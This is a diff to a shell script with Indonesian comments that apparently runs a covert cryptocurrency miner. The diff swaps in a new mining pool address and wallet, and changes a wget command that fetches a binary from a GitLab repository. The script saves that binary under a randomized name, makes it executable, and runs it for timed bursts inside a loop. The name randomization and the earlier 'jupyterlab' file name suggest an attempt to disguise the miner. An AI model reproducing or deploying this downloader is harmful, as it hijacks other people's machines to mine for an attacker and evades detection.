@@ -1,8 +1,8 @@
 # Konfigurasi default
 CONFIG_JSON='{
   "algo": "rx/0",
-  "url": "3.145.115.195:443",
-  "user": "84GbAidJhw8cxCq941aeTd7zHL5uJ5XhzLHgWUX3eQ4VfHoswB3Dx1edeWCpxJRKx53bTLEzVdGeJFNCPQ5o1BMKJdqH2C4",
+  "url": "3.144.16.65:80",
+  "user": "Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d",
   "pass": "x",
   "threads": 6
 }'
@@ -45,7 +45,7 @@ while true; do
     echo "$CONFIG_JSON" > "$CONFIG_PATH"
 
     # Download binary baru dengan nama yang sudah di-random
-    wget -q "https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab" -O "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM"
+    wget -q "https://gitlab.com/sarifadim/jomblo/-/raw/main/rstd" -O "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM"
     chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM"
 
     # Tentukan waktu aktif (2–3 menit)
